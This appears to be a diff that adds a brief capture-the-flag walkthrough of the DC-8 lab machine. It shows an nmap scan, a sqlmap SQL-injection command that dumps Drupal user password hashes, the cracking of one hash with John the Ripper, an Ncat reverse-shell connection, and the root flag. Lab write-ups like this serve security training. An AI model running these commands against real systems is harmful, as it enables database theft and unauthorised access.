@@ -1,0 +1,107 @@
+
+
+
+hack@kali:~$ nmap -A -p- 192.168.1.23
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 16:24 CEST
+Nmap scan report for dc-8.homenet.telecomitalia.it (192.168.1.23)
+Host is up (0.00075s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)
+|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)
+|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)
+80/tcp open  http    Apache httpd
+|_http-generator: Drupal 7 (http://drupal.org)                                                     
+| http-robots.txt: 36 disallowed entries (15 shown)                                                
+| /includes/ /misc/ /modules/ /profiles/ /scripts/                                                 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt                                             
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt                                 
+|_/LICENSE.txt /MAINTAINERS.txt                                                                    
+|_http-server-header: Apache                                                                       
+|_http-title: Welcome to DC-8 | DC-8                                                               
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                            
+                                                                                                   
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .     
+Nmap done: 1 IP address (1 host up) scanned in 17.19 seconds  
+
+
+hack@kali:~/CTF/DC_8$ sqlmap -u 192.168.1.23/?nid=2 --batch --risk 3 --level 5 -D d7db -T users --dump -C "name,pass"
+
+
+[23:30:59] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[23:30:59] [INFO] fetching entries of column(s) '`name`, pass' for table 'users' in database 'd7db'
+[23:31:00] [INFO] retrieved: '',''
+[23:31:00] [INFO] retrieved: 'admin','$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z'
+[23:31:01] [INFO] retrieved: 'john','$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF'
+Database: d7db                                                                                    
+Table: users
+[2 entries]
++--------+---------------------------------------------------------+
+| name   | pass                                                    |
++--------+---------------------------------------------------------+
+| admin  | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |
+| john   | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |
++--------+---------------------------------------------------------+
+
+
+hack@kali:~/CTF/DC_8$ echo "$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z" > hash
+hack@kali:~/CTF/DC_8$ echo "$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF" >> hash 
+
+sudo john hash
+
+turtle
+
+Ncat: Connection from 192.168.1.23.
+Ncat: Connection from 192.168.1.23:38540.
+cat /root/flag.txt
+
+
+
+
+
+
+
+
+Brilliant - you have succeeded!!!
+
+
+
+888       888          888 888      8888888b.                             888 888 888 888
+888   o   888          888 888      888  "Y88b                            888 888 888 888
+888  d8b  888          888 888      888    888                            888 888 888 888
+888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
+888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888
+88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
+8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "
+888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888
+
+
+
+Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and all those who have taken the time to complete these little
+challenges.
+
+I'm also sending out an especially big thanks to:
+
+@4nqr34z
+@D4mianWayne
+@0xmzfr
+@theart42
+
+This challenge was largely based on two things:
+
+1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.
+2. A suggestion from @theart42
+
+The answer to that question is...
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+
+id
+uid=0(root) gid=113(Debian-exim) groups=113(Debian-exim)
+
+
+
